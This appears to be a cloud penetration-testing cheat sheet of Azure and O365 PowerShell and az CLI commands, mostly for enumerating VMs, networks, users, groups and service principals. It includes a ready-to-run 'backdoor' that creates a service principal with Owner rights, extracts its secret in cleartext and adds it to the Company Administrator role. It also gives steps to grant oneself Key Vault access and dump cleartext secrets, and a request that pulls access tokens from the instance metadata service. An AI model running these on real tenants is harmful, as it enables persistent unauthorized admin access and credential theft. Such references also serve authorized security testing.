# Cloud Pen-testing Part-2

````markdown
## Microsoft Azure & O365 CLI Tool Cheatsheet (Part - 2)

### Virtual Machines

#### List VMs and get OS details

```powershell
Get-AzVM
$vm = Get-AzVM -Name "VM Name"
$vm.OSProfile
````

**Run commands on VMs**

```powershell
Invoke-AzVMRunCommand -ResourceGroupName $ResourceGroupName -VMName $VMName -CommandId RunPowerShellScript -ScriptPath ./powershell-script.ps1
```

#### Networking

**List virtual networks**

```powershell
Get-AzVirtualNetwork
```

**List public IP addresses assigned to virtual NICs**

```powershell
Get-AzPublicIpAddress
```

**Get Azure ExpressRoute (VPN) Info**

```powershell
Get-AzExpressRouteCircuit
```

**Get Azure VPN Info**

```powershell
Get-AzVpnConnection
```

#### Backdoors

**Create a new Azure service principal as a backdoor**

```powershell
$spn = New-AzAdServicePrincipal -DisplayName "WebService" -Role Owner
$spn
$BSTR = ::SecureStringToBSTR($spn.Secret)
$UnsecureSecret = ::PtrToStringAuto($BSTR)
$UnsecureSecret
$sp = Get-MsolServicePrincipal -AppPrincipalId <AppID>
$role = Get-MsolRole -RoleName "Company Administrator"
Add-MsolRoleMember -RoleObjectId $role.ObjectId -RoleMemberType ServicePrincipal -RoleMemberObjectId $sp.ObjectId
# Enter the AppID as username and what was returned for $UnsecureSecret as the password in the Get-Credential prompt
$cred = Get-Credential
Connect-AzAccount -Credential $cred -Tenant "tenant ID" -ServicePrincipal
```

#### MSOnline PowerShell Module

**Authentication**

```powershell
Connect-MsolService
```

**Account and Directory Information**

**List Company Information**

```powershell
Get-MSolCompanyInformation
```

**List all users**

```powershell
Get-MSolUser -All
```

**List all groups**

```powershell
Get-MSolGroup -All
```

**List members of a group (Global Admins in this case)**

```powershell
Get-MsolRole -RoleName "Company Administrator"
Get-MsolGroupMember -GroupObjectId $GUID
```

**List all user attributes**

```powershell
Get-MSolUser -All | fl
```

**List Service Principals**

```powershell
Get-MsolServicePrincipal
```

#### Az CLI Tool

**Authentication**

```powershell
az login
```

**Dump Azure Key Vaults**

**List out any key vault resources the current account can view**

```powershell
az keyvault list --query '[].name' --output tsv
```

**With contributor level access, you can give yourself the right permissions to obtain secrets.**

```powershell
az keyvault set-policy --name <KeyVaultname> --upn <YourContributorUsername> --secret-permissions get list --key-permissions get list --storage-permissions get list --certificate-permissions get list
```

**Get URI for Key Vault**

```powershell
az keyvault secret list --vault-name <KeyVaultName> --query '[].id' --output tsv
```

**Get cleartext secret from key vault**

```powershell
az keyvault secret show --id <URI from the last command> | ConvertFrom-Json
```

#### Metadata Service URL

```
http://169.254.169.254/metadata
```

**Get access tokens from the metadata service**

```
GET 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' HTTP/1.1 Metadata: true
```

#### Other Azure & O365 Tools

**MicroBurst**

Azure security assessment tool

[https://github.com/NetSPI/MicroBurst](https://github.com/NetSPI/MicroBurst)
